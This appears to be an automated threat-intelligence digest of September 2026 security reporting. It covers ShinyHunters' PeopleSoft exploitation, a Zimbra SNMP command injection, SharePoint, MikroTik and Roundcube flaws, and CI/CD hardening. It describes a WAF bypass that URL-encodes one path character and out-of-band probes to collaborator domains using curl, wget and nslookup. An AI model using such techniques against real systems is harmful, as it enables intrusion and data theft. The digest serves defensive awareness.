  - Summary: Introduction As an update to the June 2026 post, ShinyHunters Targets Education Sector with Oracle PeopleSoft Exploit , Mandiant and Google Threat Intelligence Group (GTIG) have identified renewed mass exploitation of CVE-2026-35273 by UNC6240 (ShinyHunters), along with expanded global targeting across multiple sectors. In June, the threat actor exploited this vulnerability as a zero-day predominantly against academic institutions. This new wave of activity stems from UNC6240 modifying its exploit to bypass web application firewall (WAF) rules blocking the vulnerable Environment Management Hub (PSEMHUB) endpoint. The threat actor bypassed these string-based WAF rules by URL-encoding a single character in the request path, requesting /%50SEMHUB/ in place of /PSEMHUB/ . Many WAF and reverse proxy rules match the literal path before URL decoding, while the PeopleSoft application server decodes the request and routes it to the vulnerable servlet. This allows the threat actor to reach the e
- **Google Cloud Security** (cloud_identity_infrastructure)
  - Title: ShinyHunters Renewed Mass Exploitation Campaign Targeting Oracle PeopleSoft
  - Published: 2026-09-25T14:00:00+00:00
  - Link: https://cloud.google.com/blog/topics/threat-intelligence/shinyhunters-renewed-mass-exploitation-campaign-targeting-oracle-peoplesoft/
  - Summary: Introduction As an update to the June 2026 post, ShinyHunters Targets Education Sector with Oracle PeopleSoft Exploit , Mandiant and Google Threat Intelligence Group (GTIG) have identified renewed mass exploitation of CVE-2026-35273 by UNC6240 (ShinyHunters), along with expanded global targeting across multiple sectors. In June, the threat actor exploited this vulnerability as a zero-day predominantly against academic institutions. This new wave of activity stems from UNC6240 modifying its exploit to bypass web application firewall (WAF) rules blocking the vulnerable Environment Management Hub (PSEMHUB) endpoint. The threat actor bypassed these string-based WAF rules by URL-encoding a single character in the request path, requesting /%50SEMHUB/ in place of /PSEMHUB/ . Many WAF and reverse proxy rules match the literal path before URL decoding, while the PeopleSoft application server decodes the request and routes it to the vulnerable servlet. This allows the threat actor to reach the e
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Attackers Bypass WAFs to Exploit Oracle PeopleSoft Flaw and Deploy Web Shells
  - Published: 2026-09-26T11:46:40+00:00
  - Link: https://thehackernews.com/2026/09/attackers-bypass-wafs-to-exploit-oracle.html
  - Summary: Google is warning of renewed mass exploitation of a known security vulnerability in Oracle PeopleSoft as part of a campaign targeting multiple sectors globally. The ShinyHunters-linked activity involves the weaponization of CVE-2026-35273 (CVSS score: 9.8), a critical security flaw that could result in unauthenticated remote code execution. The vulnerability was first exploited as a zero-day
- **Check Point Research** (threat_research_primary)
  - Title: 28th September – Threat Intelligence Report
  - Published: 2026-09-28T13:55:26+00:00
  - Link: https://research.checkpoint.com/2026/28th-september-threat-intelligence-report/
  - Summary: For the latest discoveries in cyber research for the week of 28th September, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES The FBI has confirmed unauthorized activity affecting FBIjobs.gov after the ShinyHunters group defaced the website. The group claimed to have stolen employee and applicant information and shared samples of purported FBI personnel […] The post 28th September – Threat Intelligence Report appeared first on Check Point Research .
- **CyberScoop** (cyber_news_breach_reporting)
  - Title: ShinyHunters trades financial extortion for a reckless war of ego with the FBI
  - Published: 2026-09-28T14:47:10+00:00
  - Link: https://cyberscoop.com/fbi-data-breach-shinyhunters-agent-safety-risk/
  - Summary: Cybercrime experts are stunned as ShinyHunters risks agent safety and intense federal heat in a bizarre attempt to force the retraction of an agency advisory. The post ShinyHunters trades financial extortion for a reckless war of ego with the FBI appeared first on CyberScoop .
- **Risky Business News** (practitioner_analysis)
  - Title: Srsly Risky Biz: “Rogue AI” isn’t going anywhere
  - Published: 2026-10-01T02:38:57+00:00
  - Link: https://risky.biz/SRB185/
  - Summary: Amberleigh Jack and James Wilson chat about OpenAI agents’ recent escapades into Australian government websites. OpenAI has promised to “rebuild trust with Australians” but we’re likely getting a glimpse into the new normal, here. They also discuss how the ShinyHunters hacking group has found itself on law enforcement’s target list after breaching FBI systems. The group played some stupid games and they appear to be in the “stupid prizes” stage. This episode is also available on YouTube
- **Krebs on Security** (practitioner_analysis)
  - Title: Dutch Police Arrest ‘Reformed’ Hacker in Shiny Hunters Investigation
  - Published: 2026-09-28T15:08:57+00:00
  - Link: https://krebsonsecurity.com/2026/09/dutch-police-arrest-reformed-hacker-in-shiny-hunters-investigation/
  - Summary: Authorities in the Netherlands have arrested a 23-year-old convicted cybercriminal on suspicion of aiding in data thefts and extortions by the prolific hacker group ShinyHunters. In the days immediately following the suspect's arrest, remaining ShinyHunters members dramatically escalated their attacks, stealing highly sensitive data from the FBI and extorting the Russian ransomware group Cl0p.

### Cluster a14cf81e36 — score 30

- Title: Unauthenticated command injection on internet-facing mail servers: tracking CVE-2026-73570
- Source: Microsoft Security Blog (threat_research_primary)
- Published: 2026-09-30T14:00:00+00:00
- Link: https://www.microsoft.com/en-us/security/blog/2026/09/30/unauthenticated-command-injection-on-internet-facing-mail-servers-tracking-cve-2026-73570/
- Fetch status: ok
- Member count: 3
- Corroborating source count: 3
- Strong signals: CVE-2026-73570

#### Cluster taxonomy (union across members)
- affected_products: Microsoft Defender
- cve_ids: CVE-2026-73570
- urgency_signals: preauth_unauth
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_1_primary_research, tier_4_news

#### Primary article taxonomy
- affected_products: Microsoft Defender
- cve_ids: CVE-2026-73570
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_primary_research

#### Summary

```
Microsoft Threat Intelligence examines CVE-2026-73570 exploitation in Zimbra, including observed attack paths, detection opportunities, and mitigation guidance. The post Unauthenticated command injection on internet-facing mail servers: tracking CVE-2026-73570 appeared first on Microsoft Security Blog .
```

#### Full body

```
Share Link copied to clipboard! Content types Research Products and services Microsoft Defender Topics Actionable threat insights Threat intelligence Microsoft Threat Intelligence identified and tracked exploitation of CVE-2026-73570 , an unauthenticated OS command injection vulnerability in the Zimbra Collaboration Suite SNMP notification path. Exploitation can be triggered by a specially crafted email against internet-facing Zimbra servers when the optional zimbra-snmp package is installed and SNMP notifications are enabled, without requiring authentication or user interaction. Following successful exploitation, observed activity included deployment of JSP web shells and reverse shells, privilege escalation, persistent remote-access tooling, and memory-backed execution. Threat actors also accessed email and collected authentication and mailbox data, with archive creation and subsequent transfer activity observed. The activity included both automated payload delivery and hands-on-keyboard operations on compromised mail servers. Microsoft observed affected organizations in more than one region and industry. Based on the environments investigated, exploitation was not limited to a single sector or geographic area. The diagram combines behaviors observed across multiple confirmed compromises; no single host necessarily exhibited every stage. From remediation to public disclosure CVE-2026-73570 is an unauthenticated OS command-injection vulnerability in the Zimbra Collaboration Suite SNMP notification path. An attacker can send a specially crafted SMTP request that introduces untrusted input into SNMP notification processing. If the input is not sufficiently sanitized, embedded shell commands can execute with the privileges of the zimbra service account. Exploitation requires the optional zimbra-snmp package to be installed and SNMP notifications to be enabled. Zimbra version 10.1.20, released July 20, 2026, contains the relevant remediation. CVE-2026-73570 was publicly disclosed on August 13, 2026. Microsoft telemetry identified activity targeting the same injection path during the interval between those events. Attack chain overview Figure 1. CVE-2026-73570 attack chain, mapped to MITRE ATT&CK tactics and composited across all confirmed compromises. Pre-disclosure reconnaissance and pre-exploitation probing Between July 28 and August 7, after a fix became available on July 20 but before public disclosure on August 13, Microsoft observed two distinct out-of-band scanning tools probing the vulnerable injection point. The activity used the same swatchdog-to-snmptrap execution path later observed during exploitation. The operators first validated command execution using lightweight out-of-band probes to unique subdomains hosted on public interaction and collaborator services, including oast[.]fun, oast[.]online, dnslog[.]pp[.]ua, requestrepo[.]com, and campaign-associated infrastructure under bypass[.]eu[.]org. The probes included HTTP requests and DNS, ICMP, and in-band identity checks, using commands such as curl, wget, ping, nslookup, and id. HTTP requests used the CVE-specific ZB73570 User-Agent, while DNS and ICMP requests used randomized callback subdomains. The probes were designed to confirm execution without delivering a payload by performing local identity checks or dropping a small system fingerprint script, demonstrating both command execution and external access to the server’s webroot. Figure 2. Out-of-band command-execution validation using HTTP, DNS, and ICMP callbacks to unique collaborator subdomains. Initial access CVE-2026-73570 allows a crafted SMTP request containing shell metacharacters to reach Zimbra’s SNMP notification processing. When a service-state change triggers health monitoring, swatchdog incorporates the attacker-controlled value into a snmptrap shell invocation, enabling command execution. Figure 3. CVE-2026-73570 command-injection sequence that changes webroot permissions, reconstructs encoded fr
```

#### Corroborating sources (3)

- **Microsoft Security Blog** (threat_research_primary)
  - Title: Unauthenticated command injection on internet-facing mail servers: tracking CVE-2026-73570
  - Published: 2026-09-30T14:00:00+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/09/30/unauthenticated-command-injection-on-internet-facing-mail-servers-tracking-cve-2026-73570/
  - Summary: Microsoft Threat Intelligence examines CVE-2026-73570 exploitation in Zimbra, including observed attack paths, detection opportunities, and mitigation guidance. The post Unauthenticated command injection on internet-facing mail servers: tracking CVE-2026-73570 appeared first on Microsoft Security Blog .
- **Microsoft Threat Intelligence** (threat_research_primary)
  - Title: Unauthenticated command injection on internet-facing mail servers: tracking CVE-2026-73570
  - Published: 2026-09-30T14:00:00+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/09/30/unauthenticated-command-injection-on-internet-facing-mail-servers-tracking-cve-2026-73570/
  - Summary: Microsoft Threat Intelligence examines CVE-2026-73570 exploitation in Zimbra, including observed attack paths, detection opportunities, and mitigation guidance. The post Unauthenticated command injection on internet-facing mail servers: tracking CVE-2026-73570 appeared first on Microsoft Security Blog .
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Attackers Exploit Zimbra Flaw to Deploy Web Shells and Harvest Authentication Secrets
  - Published: 2026-09-30T16:46:29+00:00
  - Link: https://thehackernews.com/2026/09/attackers-exploit-zimbra-flaw-to-deploy.html
  - Summary: Threat actors have weaponized a now-patched security flaw in Zimbra Collaboration Suite (ZCS) to deploy web shells and access mailbox data, according to findings from the Microsoft Security Research team. The attack exploits CVE-2026-73570 (CVSS score: 8.9), an unauthenticated operating system command injection flaw that can lead to remote code execution when Simple Network Management Protocol

### Cluster 1f0734997f — score 29

- Title: Vulnerability Discovery and Exploitation Trends in the AI Era
- Source: Google Cloud Threat Intelligence (threat_research_primary)
- Published: 2026-09-30T14:00:00+00:00
- Link: https://cloud.google.com/blog/topics/threat-intelligence/vulnerability-discovery-and-exploitation-trends-in-the-ai-era/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, vulnerability_disclosure, zero_day
- affected_products: Linux kernel
- urgency_signals: zero_day
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_primary_research, tier_2_operator

#### Primary article taxonomy
- threat_categories: zero_day, vulnerability_disclosure, active_exploitation
- affected_products: Linux kernel
- urgency_signals: zero_day
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_primary_research

#### Summary

```
Written by: Robin Grunewald, Supriya Mazumdar, Kelli Vanderlee Introduction Google Threat Intelligence Group (GTIG) examines vulnerability disclosure and exploitation statistics to evaluate the impact of artificial intelligence (AI) on the vulnerability threat landscape. We found that AI is measurably changing not just the pace of vulnerability discovery and exploitation, but also the types and typical risk profiles of vulnerabilities that are being discovered. Key findings: Vulnerability disclosures doubled: the number of vulnerabilities disclosed per month doubled, rising from 5,045 in January 2026 to 10,477 in July and continuing to climb to 10,740 in August 2026. Vulnerability exploitation nearly doubled: the number of vulnerabilities exploited increased from an average of 10.5 per month in 2025 to an average of 18 per month from January 2026 to August 2026. Zero-day exploitation increased marginally: zero-day vulnerability exploitation grew from an average of 8 per month in 2025 t
```

#### Full body

```
Threat Intelligence Vulnerability Discovery and Exploitation Trends in the AI Era September 30, 2026 Google Threat Intelligence Group Google Threat Intelligence Visibility and context on the threats that matter most. Contact Us & Get a Demo Written by: Robin Grunewald, Supriya Mazumdar, Kelli Vanderlee Introduction Google Threat Intelligence Group (GTIG) examines vulnerability disclosure and exploitation statistics to evaluate the impact of artificial intelligence (AI) on the vulnerability threat landscape. We found that AI is measurably changing not just the pace of vulnerability discovery and exploitation, but also the types and typical risk profiles of vulnerabilities that are being discovered. Key findings: Vulnerability disclosures doubled: the number of vulnerabilities disclosed per month doubled, rising from 5,045 in January 2026 to 10,477 in July and continuing to climb to 10,740 in August 2026. Vulnerability exploitation nearly doubled: the number of vulnerabilities exploited increased from an average of 10.5 per month in 2025 to an average of 18 per month from January 2026 to August 2026. Zero-day exploitation increased marginally: zero-day vulnerability exploitation grew from an average of 8 per month in 2025 to an average of 11 per month from January 2026 to August 2026. AI finds more consequential vulnerabilities: AI-assisted discovery found proportionally fewer Low-Risk vulnerabilities, more Moderate-Risk vulnerabilities, and more vulnerabilities leading to remote code execution (RCE). GTIG expects that vulnerability discovery and exploitation will continue to grow in the short to medium term. To counter the increased risk from rapid vulnerability discovery and exploitation, organizations must transition from unprioritized mass-patching to threat-intelligence-driven triage, combining targeted edge-defense with automated, agentic remediation. Scope & Methodology This GTIG analysis examines trends in vulnerabilities disclosed from January 1, 2025 through August 31, 2026. The dataset tracks the vulnerabilities alongside critical operational dimensions, including exploitation consequences and GTIG Vulnerability Risk Ratings , and in-the-wild exploitation. When we refer to risk ratings in this blog, we are using GTIG vulnerability risk ratings, not CVSS severity . While the baseline monitoring encompasses the full 20-month window (January 2025–August 2026), this report specifically focuses on growth velocity and emerging threat vectors. The research seeks to evaluate the impact of AI across the cybersecurity landscape both in terms of rates of Common Vulnerabilities and Exposures (CVE) disclosure and rates of exploitation. We also examine vulnerabilities targeting the AI/large language model (LLM) operational stack. CVE Disclosure Doubled in 2026 Vulnerability disclosures doubled from 5,045 in January 2026 to 10,477 in July, with the count of disclosed vulnerabilities reaching a peak of 10,740 in August (Figure 1). Distinguishing Threat Risk from CVE Inflation However, raw disclosure volume throughout 2026 can be misleading without threat intelligence context. Automated CVE Numbering Authority (CNA) assignment policies across open-source ecosystems can inflate baseline figures; for instance, vulnerabilities with a description containing “Linux Kernel” alone generated approximately 5,000 CVEs between January 2026 and August 2026 with zero observed exploited in-the-wild zero-days. Figure 1: Count of vulnerabilities disclosed, January 2025 - August 2026 (Source: GTIG) In terms of risk ratings, the most interesting increase occurred in High-Risk vulnerabilities, which surged from 131 disclosures in January 2026 to 350 in August 2026, a 167% growth (Figure 2). High-Risk vulnerabilities remain a small proportion (3% in August 2026) of all vulnerabilities disclosed. Figure 2: Count of vulnerabilities disclosed by GTIG vulnerability risk rating, January 2025 - August 2026 (Source: GTIG) The increase in High-Risk vulnerabiliti
```

#### Corroborating sources (2)

- **Google Cloud Threat Intelligence** (threat_research_primary)
  - Title: Vulnerability Discovery and Exploitation Trends in the AI Era
  - Published: 2026-09-30T14:00:00+00:00
  - Link: https://cloud.google.com/blog/topics/threat-intelligence/vulnerability-discovery-and-exploitation-trends-in-the-ai-era/
  - Summary: Written by: Robin Grunewald, Supriya Mazumdar, Kelli Vanderlee Introduction Google Threat Intelligence Group (GTIG) examines vulnerability disclosure and exploitation statistics to evaluate the impact of artificial intelligence (AI) on the vulnerability threat landscape. We found that AI is measurably changing not just the pace of vulnerability discovery and exploitation, but also the types and typical risk profiles of vulnerabilities that are being discovered. Key findings: Vulnerability disclosures doubled: the number of vulnerabilities disclosed per month doubled, rising from 5,045 in January 2026 to 10,477 in July and continuing to climb to 10,740 in August 2026. Vulnerability exploitation nearly doubled: the number of vulnerabilities exploited increased from an average of 10.5 per month in 2025 to an average of 18 per month from January 2026 to August 2026. Zero-day exploitation increased marginally: zero-day vulnerability exploitation grew from an average of 8 per month in 2025 t
- **Google Cloud Security** (cloud_identity_infrastructure)
  - Title: Vulnerability Discovery and Exploitation Trends in the AI Era
  - Published: 2026-09-30T14:00:00+00:00
  - Link: https://cloud.google.com/blog/topics/threat-intelligence/vulnerability-discovery-and-exploitation-trends-in-the-ai-era/
  - Summary: Written by: Robin Grunewald, Supriya Mazumdar, Kelli Vanderlee Introduction Google Threat Intelligence Group (GTIG) examines vulnerability disclosure and exploitation statistics to evaluate the impact of artificial intelligence (AI) on the vulnerability threat landscape. We found that AI is measurably changing not just the pace of vulnerability discovery and exploitation, but also the types and typical risk profiles of vulnerabilities that are being discovered. Key findings: Vulnerability disclosures doubled: the number of vulnerabilities disclosed per month doubled, rising from 5,045 in January 2026 to 10,477 in July and continuing to climb to 10,740 in August 2026. Vulnerability exploitation nearly doubled: the number of vulnerabilities exploited increased from an average of 10.5 per month in 2025 to an average of 18 per month from January 2026 to August 2026. Zero-day exploitation increased marginally: zero-day vulnerability exploitation grew from an average of 8 per month in 2025 t

### Cluster 5ccb851e5d — score 26

- Title: SharePoint RCE and MikroTik RouterOS Flaws Actively Exploited in the Wild
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-26T08:49:53+00:00
- Link: https://thehackernews.com/2026/09/sharepoint-rce-and-mikrotik-routeros.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-65660, Microsoft SharePoint

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- affected_industries: government
- affected_products: Android, Microsoft SharePoint
- cve_ids: CVE-2026-65660, CVE-2026-67279, CVE-2026-86060
- urgency_signals: actively_exploited, no_patch_yet, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_industries: government
- affected_products: Microsoft SharePoint, Android
- cve_ids: CVE-2026-65660, CVE-2026-67279, CVE-2026-86060
- urgency_signals: actively_exploited, preauth_unauth, no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Friday added two security flaws impacting Microsoft SharePoint and Mikrotik RouterOS to its Known Exploited Vulnerabilities (KEV) catalog, citing evidence of active exploitation. The vulnerabilities in question are as follows - CVE-2026-65660 (CVSS score: 8.8) - A code injection vulnerability in Microsoft Office SharePoint
```

#### Full body

```
SharePoint RCE and MikroTik RouterOS Flaws Actively Exploited in the Wild  Ravie Lakshmanan  Sep 26, 2026 Vulnerability / Network Security The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Friday added two security flaws impacting Microsoft SharePoint and Mikrotik RouterOS to its Known Exploited Vulnerabilities ( KEV ) catalog, citing evidence of active exploitation. The vulnerabilities in question are as follows - CVE-2026-65660 (CVSS score: 8.8) - A code injection vulnerability in Microsoft Office SharePoint that allows an authorized attacker to execute code over a network. CVE-2026-67279 (CVSS score: 6.9) - An improper enforcement of behavioral workflow vulnerability in Mikrotik RouterOS that could allow an unauthenticated client to open a session channel and send an exec request. As reported by The Hacker News earlier this week, CVE-2026-65660 was originally described by Microsoft as a spoofing vulnerability impacting SharePoint Server. The tech giant has since updated the advisory to state that it could be abused to obtain remote code execution. "As of 9/25/2026, Microsoft had reliable evidence of observed attacks against exploitation of this vulnerability," the Windows maker noted . Microsoft hasn't disclosed who was behind the exploitation efforts, when they started, how many organizations have been targeted, how many of them have been successful, and what attackers did once inside the vulnerable service. According to telemetry data shared by Previdian, a total of 16 exploitation attempts targeting its sensors were detected on September 24, 2026. These efforts originated from IP addresses located in the U.K. and Israel. The second vulnerability to be added to the KEV catalog is CVE-2026-67279, which has been chained along with CVE-2026-86060, an argument injection flaw in the RouterOS login process, as part of an exploit codenamed MikroTrick . The exploit chain has been employed to take full administrative control of internet-exposed susceptible routers without the need for a password, per CERT Polska. "Combining the two vulnerabilities resulted in full unauthenticated access to the administrative console," the Polish cybersecurity agency said . "CVE-2026-67279 allowed an unauthenticated client to create a session channel, while CVE-2026-86060 allowed it to supply login with an attacker-controlled policy mask." In a separate analysis, Bishop Fox said it was able to reproduce the complete administrative takeover on vulnerable RouterOS 7.x builds. "MikroTrick combines two failures at different trust boundaries," security researcher Emilio Gallegos said . "The first allows an unauthenticated connection to reach functionality that RouterOS should expose only after login. The second causes the login process to treat data from that connection as a trusted administrative identity." "MikroTrick exposes a design risk in privileged software: a feature intended only for trusted local callers becomes a remote attack surface when an upstream component loses track of authentication state." It's worth noting that CISA added CVE-2026-86060 to its KEV catalog on September 11, 2026. Federal Civilian Executive Branch (FCEB) agencies have time until September 28, 2026, to apply the necessary fixes. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Microsoft , network security , Vulnerability ⚡ Top Stories This Week Roundcube Pre-Auth SQL Injection Flaw Actively Exploited in the Wild Cloudflare Fixes Flaw That Let One Container Read Another Customer's Leftover Disk Data Unpatched OnePlus Flaws Let Installed Android Apps Gain Root Without Permissions ThreatsDay: AI Search Poisoning, AI Coding Tool Leaking Repos, One-Click Code Execution and 13 More Stories Placeholder third-party[.]com Referenced Across 1,700+ Repositories Now Serves Malicious Content OpenAI Agent Bypassed Australian Medicare Portal
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: SharePoint RCE and MikroTik RouterOS Flaws Actively Exploited in the Wild
  - Published: 2026-09-26T08:49:53+00:00
  - Link: https://thehackernews.com/2026/09/sharepoint-rce-and-mikrotik-routeros.html
  - Summary: The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Friday added two security flaws impacting Microsoft SharePoint and Mikrotik RouterOS to its Known Exploited Vulnerabilities (KEV) catalog, citing evidence of active exploitation. The vulnerabilities in question are as follows - CVE-2026-65660 (CVSS score: 8.8) - A code injection vulnerability in Microsoft Office SharePoint

### Cluster 6b592b3549 — score 24

- Title: Roundcube Pre-Auth SQL Injection Flaw Actively Exploited in the Wild
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-25T10:14:02+00:00
- Link: https://thehackernews.com/2026/09/roundcube-pre-auth-sql-injection-flaw.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-48842

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, web_shell_backdoor, zero_day
- actor_attribution: ShinyHunters
- affected_products: Android, Microsoft Defender, WordPress
- cve_ids: CVE-2025-49113, CVE-2025-68461, CVE-2026-48842
- urgency_signals: actively_exploited, critical_cvss, no_patch_yet, poc_available, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, web_shell_backdoor, active_exploitation
- actor_attribution: ShinyHunters
- affected_products: WordPress, Microsoft Defender, Android
- cve_ids: CVE-2026-48842, CVE-2025-49113, CVE-2025-68461
- urgency_signals: actively_exploited, zero_day, preauth_unauth, no_patch_yet, poc_available, critical_cvss
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The Canadian Centre for Cyber Security has warned that a now-patched Roundcube Webmail vulnerability is being actively exploited in the wild. The vulnerability in question is CVE-2026-48842 (CVSS score: 8.1), a pre-authentication SQL injection in the virtuser_query plugin of Roundcube Webmail versions 1.6.x before 1.6.16 and 1.7.x before 1.7.1. The issue stems from a preg_replace() backslash
```

#### Full body

```
Roundcube Pre-Auth SQL Injection Flaw Actively Exploited in the Wild  Ravie Lakshmanan  Sep 25, 2026 Vulnerability / Email Security The Canadian Centre for Cyber Security has warned that a now-patched Roundcube Webmail vulnerability is being actively exploited in the wild. The vulnerability in question is CVE-2026-48842 (CVSS score: 8.1), a pre-authentication SQL injection in the virtuser_query plugin of Roundcube Webmail versions 1.6.x before 1.6.16 and 1.7.x before 1.7.1. The issue stems from a preg_replace() backslash escape bypass that allows attackers to inject arbitrary SQL statements without authentication. "Unauthenticated attackers can inject SQL into Roundcube's database backend through the virtuser_query plugin, potentially exposing mail account credentials and stored messages," SentinelOne said . Patches for the vulnerability were released by Roundcube in May 2026 as part of 1.6.16 and 1.7.1. In an update shared this week, the Cyber Centre said the security flaw is being actively exploited in the wild, citing open-source reporting. No additional details of the exploitation activity have been disclosed. Data from the Shadowserver Foundation shows that there are more than 523,000 Roundcube instances exposed to the internet, with 10 of them flagged as vulnerable hosts as of September 23, 2026. Vulnerabilities in Roundcube have been an attractive target for threat actors looking to harvest sensitive email communications. In July 2026, Proofpoint said it identified a suspected China-aligned adversary dubbed UNK_MassTraction exploiting known security flaws in Roundcube to deliver web shells or a post-exploitation tool called VShell. Way back in February 2026, two other vulnerabilities in the same product (CVE-2025-49113 and CVE-2025-68461) were tagged as actively exploited by the U.S. Cybersecurity and Infrastructure Security Agency (CISA). Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  email security , Vulnerability , Web Security ⚡ Top Stories This Week Roundcube Pre-Auth SQL Injection Flaw Actively Exploited in the Wild Cloudflare Fixes Flaw That Let One Container Read Another Customer's Leftover Disk Data Unpatched OnePlus Flaws Let Installed Android Apps Gain Root Without Permissions ThreatsDay: AI Search Poisoning, AI Coding Tool Leaking Repos, One-Click Code Execution and 13 More Stories Placeholder third-party[.]com Referenced Across 1,700+ Repositories Now Serves Malicious Content OpenAI Agent Bypassed Australian Medicare Portal Controls to Access Non-Public Files A Leaked GitLab Issue Email Address Lets Anyone Push Code and Run CI Jobs as You MikroTrick Chain Let Attackers Take Over MikroTik Routers Without a Password or SSH Key New cPanel Flaw Lets a Hosting Account Run Code as Root, Take Full Server Control Exploit Released for Unpatched Ubuntu Linux Flaw Enabling Host-Root Container Escape F5 Patches Critical BIG-IP APM Zero-Day Exploited for Unauthenticated RCE on OAuth Servers Critical Next.js ImageResponse Flaw Can Lead to Server Code Execution via Crafted SVG Input ShinyHunters Claims FBI Breach, Says It Stole Data on Agents and Job Applicants Check Point Warns of Management Server Zero-Day Exploited in Targeted Attacks WordPress Issues Patch for Critical Flaw That Can Enable Code Execution on Some Servers Researcher Drops BigDiskBuster Zero-Day PoC That Blocks Microsoft Defender Updates New CVSS 10.0 VeloCloud Orchestrator Flaw Actively Exploited in Certificate-Based Setups New Linux Kernel Flaw Gives ARM64 KVM Guests Read-Write Access to Host Memory SharePoint Flaw Initially Listed as Spoofing by Microsoft Enables Authenticated RCE One Hidden Meta Muse Setting Could Let Attackers Turn the AI Assistant Into a Backdoor WordPress Comment2Shell Flaw Can Turn Anonymous Comment XSS Into RCE via Admin Session Zyxel and Veeam Flaws Under Active Exploitation With Command and SYSTEM Ac
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Roundcube Pre-Auth SQL Injection Flaw Actively Exploited in the Wild
  - Published: 2026-09-25T10:14:02+00:00
  - Link: https://thehackernews.com/2026/09/roundcube-pre-auth-sql-injection-flaw.html
  - Summary: The Canadian Centre for Cyber Security has warned that a now-patched Roundcube Webmail vulnerability is being actively exploited in the wild. The vulnerability in question is CVE-2026-48842 (CVSS score: 8.1), a pre-authentication SQL injection in the virtuser_query plugin of Roundcube Webmail versions 1.6.x before 1.6.16 and 1.7.x before 1.7.1. The issue stems from a preg_replace() backslash

### Cluster 15a5b415da — score 23

- Title: Proactive Defense: Hardening Code Pipelines and CI/CD Infrastructure
- Source: Google Cloud Threat Intelligence (threat_research_primary)
- Published: 2026-09-24T14:00:00+00:00
- Link: https://cloud.google.com/blog/topics/threat-intelligence/hardening-code-pipelines-and-ci-cd-infrastructure/
- Fetch status: ok
- Member count: 7
- Corroborating source count: 7
- Strong signals: GitHub

#### Cluster taxonomy (union across members)
- threat_categories: ddos, phishing_social_eng, supply_chain
- affected_industries: critical_infrastructure
- affected_products: AWS, GitHub
- cve_ids: CVE-2026-79417
- urgency_signals: poc_available
- content_type: incident_report, news_report, vulnerability_disclosure
- confidence_tier: tier_1_offensive_research, tier_1_primary_research, tier_2_operator, tier_3_analysis, tier_4_news, tier_5_chatter

#### Primary article taxonomy
- threat_categories: supply_chain, phishing_social_eng
- affected_industries: critical_infrastructure
- affected_products: GitHub
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Introduction The landscape of software supply chain security has undergone a significant shift. Recent campaigns demonstrate that sophisticated threat actors are systematically targeting the engineering lifecycle by compromising trusted security and programming tools. These intrusions reveal three key tactics: Attackers target trusted security scanners, utility libraries, and AI developer tools to exploit the elevated privileges granted to these systems within build pipelines. Adversaries target developer workstations and Integrated Development Environments (IDEs) via highly tailored social engineering, malicious extensions, or typosquatted local dependencies to exfiltrate private cryptographic keys, API tokens, and active session credentials directly from local engineering environments. Rather than relying solely on compromised static credentials, attackers have escalated to advanced pipeline manipulation techniques, including GitHub Actions cache poisoning, OpenID Connect ( OIDC) tok
```

#### Full body

```
Threat Intelligence Proactive Defense: Hardening Code Pipelines and CI/CD Infrastructure September 24, 2026 Mandiant Mandiant Services Stop attacks, reduce risk, and advance your security. Contact Mandiant Introduction The landscape of software supply chain security has undergone a significant shift. Recent campaigns demonstrate that sophisticated threat actors are systematically targeting the engineering lifecycle by compromising trusted security and programming tools. These intrusions reveal three key tactics: Attackers target trusted security scanners, utility libraries, and AI developer tools to exploit the elevated privileges granted to these systems within build pipelines. Adversaries target developer workstations and Integrated Development Environments (IDEs) via highly tailored social engineering, malicious extensions, or typosquatted local dependencies to exfiltrate private cryptographic keys, API tokens, and active session credentials directly from local engineering environments. Rather than relying solely on compromised static credentials, attackers have escalated to advanced pipeline manipulation techniques, including GitHub Actions cache poisoning, OpenID Connect ( OIDC) token extraction, and the subversion of mutable action tags to publish compromised packages that still carry legitimate cryptographic provenance. Building upon prior guidance ( here , and here ), this blog provides an actionable blueprint for software and platform architects designed to safeguard the software supply chain against threat vectors that are actively being exploited, third-party risks, and architectural vulnerabilities throughout the entire Software Development Lifecycle (SDLC). Read on for more on how to establish continuous integration and continuous delivery/deployment ( CI/CD) safeguards, strengthen developer workflows, and build robust, end-to-end defense-in-depth. The Multi-Layered Approach Treating each stage of the pipeline as independent security domains is no longer sufficient because these multi-layered attacks target vulnerabilities across the entire build pipeline. Defending against these persistent threats requires a thorough, defense-in-depth approach spanning the five key pillars of the software development lifecycle outlined in Figure 1: Figure 1: The five core pillars for securing the software development lifecycle Endpoint Developer workstations are high-value targets because they hold direct, privileged access to repositories, pipelines, and cloud environments. Threat actors frequently target IDEs, 